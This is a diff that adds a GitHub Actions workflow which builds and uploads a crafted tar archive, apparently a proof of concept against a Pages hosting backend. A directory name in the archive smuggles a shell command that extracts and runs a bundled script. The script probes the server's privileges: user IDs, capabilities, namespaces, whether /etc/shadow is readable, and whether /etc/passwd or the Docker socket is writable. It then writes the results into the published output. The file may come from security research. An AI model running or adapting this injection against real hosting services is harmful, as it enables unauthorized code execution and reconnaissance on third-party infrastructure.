@@ -1,0 +1,93 @@
+name: Pages bounded backend privilege canary
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create bounded privilege canary tar
+        run: |
+          python3 - <<'PY'
+          import hashlib
+          import io
+          import tarfile
+
+          directory = 'x\';f(){ /bin/tar -xOf "$4" s|/bin/sh -s -- "$3" "$5";};f \''
+          script = r'''#!/bin/sh
+          version=$1
+          dest=$2
+          parent=${dest%/*}
+          grandparent=${parent%/*}
+          {
+            echo CANARY=BB_PAGES_PRIVILEGE_V1
+            printf 'ID='; /usr/bin/id
+            printf 'HOSTNAME='; /bin/hostname
+            printf 'UMASK=%s\n' "$(umask)"
+            /usr/bin/stat -c 'DEST_MODE=%a DEST_UID=%u DEST_GID=%g' "$dest"
+            /usr/bin/stat -c 'PARENT_MODE=%a PARENT_UID=%u PARENT_GID=%g' "$parent"
+            /usr/bin/stat -c 'GRANDPARENT_MODE=%a GRANDPARENT_UID=%u GRANDPARENT_GID=%g' "$grandparent"
+            /usr/bin/stat -f -c 'DEST_FS_TYPE=%T' "$dest"
+            /usr/bin/awk '/^(Uid|Gid|Groups|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp|Seccomp_filters):/{print}' "/proc/$$/status"
+            if [ -w / ]; then echo ROOT_WRITABLE=1; else echo ROOT_WRITABLE=0; fi
+            if [ -w /tmp ]; then echo TMP_WRITABLE=1; else echo TMP_WRITABLE=0; fi
+            if [ -w "$parent" ]; then echo PARENT_WRITABLE=1; else echo PARENT_WRITABLE=0; fi
+            if [ -w "$grandparent" ]; then echo GRANDPARENT_WRITABLE=1; else echo GRANDPARENT_WRITABLE=0; fi
+            if [ -r /etc/shadow ]; then echo SHADOW_READABLE=1; else echo SHADOW_READABLE=0; fi
+            if [ -w /etc/passwd ]; then echo PASSWD_WRITABLE=1; else echo PASSWD_WRITABLE=0; fi
+            if [ -S /var/run/docker.sock ]; then
+              echo DOCKER_SOCKET_PRESENT=1
+              if [ -w /var/run/docker.sock ]; then echo DOCKER_SOCKET_WRITABLE=1; else echo DOCKER_SOCKET_WRITABLE=0; fi
+            else
+              echo DOCKER_SOCKET_PRESENT=0
+              echo DOCKER_SOCKET_WRITABLE=0
+            fi
+            if [ -e /.dockerenv ]; then echo DOCKER_ENV_MARKER=1; else echo DOCKER_ENV_MARKER=0; fi
+            self_mnt=$(/usr/bin/readlink "/proc/$$/ns/mnt" 2>/dev/null || :)
+            init_mnt=$(/usr/bin/readlink /proc/1/ns/mnt 2>/dev/null || :)
+            if [ -n "$self_mnt" ] && [ "$self_mnt" = "$init_mnt" ]; then echo MNT_NS_EQUALS_PID1=1; else echo MNT_NS_EQUALS_PID1=0; fi
+            self_pid=$(/usr/bin/readlink "/proc/$$/ns/pid" 2>/dev/null || :)
+            init_pid=$(/usr/bin/readlink /proc/1/ns/pid 2>/dev/null || :)
+            if [ -n "$self_pid" ] && [ "$self_pid" = "$init_pid" ]; then echo PID_NS_EQUALS_PID1=1; else echo PID_NS_EQUALS_PID1=0; fi
+            self_user=$(/usr/bin/readlink "/proc/$$/ns/user" 2>/dev/null || :)
+            init_user=$(/usr/bin/readlink /proc/1/ns/user 2>/dev/null || :)
+            if [ -n "$self_user" ] && [ "$self_user" = "$init_user" ]; then echo USER_NS_EQUALS_PID1=1; else echo USER_NS_EQUALS_PID1=0; fi
+            if [ -r "/proc/$$/attr/current" ]; then
+              printf 'LSM='
+              /usr/bin/head -c 128 "/proc/$$/attr/current" 2>/dev/null || :
+              printf '\n'
+            else
+              echo LSM=unavailable
+            fi
+          } > "$dest/privilege-9e4a"
+          printf '%s\n' "$version" > "$dest/pages-build-version"
+          '''
+
+          assert len(directory.encode()) == 58
+          assert len(script.encode()) == 2512
+          assert hashlib.sha256(script.encode()).hexdigest() == '1a67f4d833004366af86fcde73a66c998b95e895dbb7fffdc8e2c792283843c6'
+          directory_header = tarfile.TarInfo(directory)
+          directory_header.type = tarfile.DIRTYPE
+          directory_header.mode = 0o755
+          script_header = tarfile.TarInfo('s')
+          script_header.mode = 0o600
+          script_header.size = len(script.encode())
+          with tarfile.open('pages-privilege-canary.tar', 'w', format=tarfile.USTAR_FORMAT) as archive:
+              archive.addfile(directory_header)
+              archive.addfile(script_header, io.BytesIO(script.encode()))
+          with open('pages-privilege-canary.tar', 'rb') as artifact:
+              artifact_bytes = artifact.read()
+          assert len(artifact_bytes) == 10240
+          assert hashlib.sha256(artifact_bytes).hexdigest() == 'e792fdeb7255f0434ba7b678a584774498dcc38845fc4abf215f16ada63f6061'
+          PY
+
+      - name: Upload without ZIP wrapping
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          path: pages-privilege-canary.tar
+          archive: false
+          retention-days: 1
